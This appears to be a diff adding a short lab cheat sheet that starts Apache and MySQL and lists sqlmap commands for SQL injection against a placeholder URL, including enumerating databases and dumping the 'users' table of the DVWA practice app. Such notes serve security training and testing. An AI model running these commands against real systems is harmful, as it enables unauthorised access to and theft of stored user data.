@@ -1,1 +1,21 @@
+# Start services
+sudo systemctl start apache2
+sudo systemctl start mysql
 
+# Basic scan
+sqlmap -u "URL" --batch
+
+# Get databases
+sqlmap -u "URL" --cookie="COOKIE" --dbs
+
+# Get tables
+sqlmap -u "URL" --cookie="COOKIE" -D dvwa --tables
+
+# Dump data
+sqlmap -u "URL" --cookie="COOKIE" -D dvwa -T users --dump
+
+# Increase level
+sqlmap -u "URL" --cookie="COOKIE" --level=3 --risk=2
+
+# Forms testing
+sqlmap -u "URL" --forms --batch
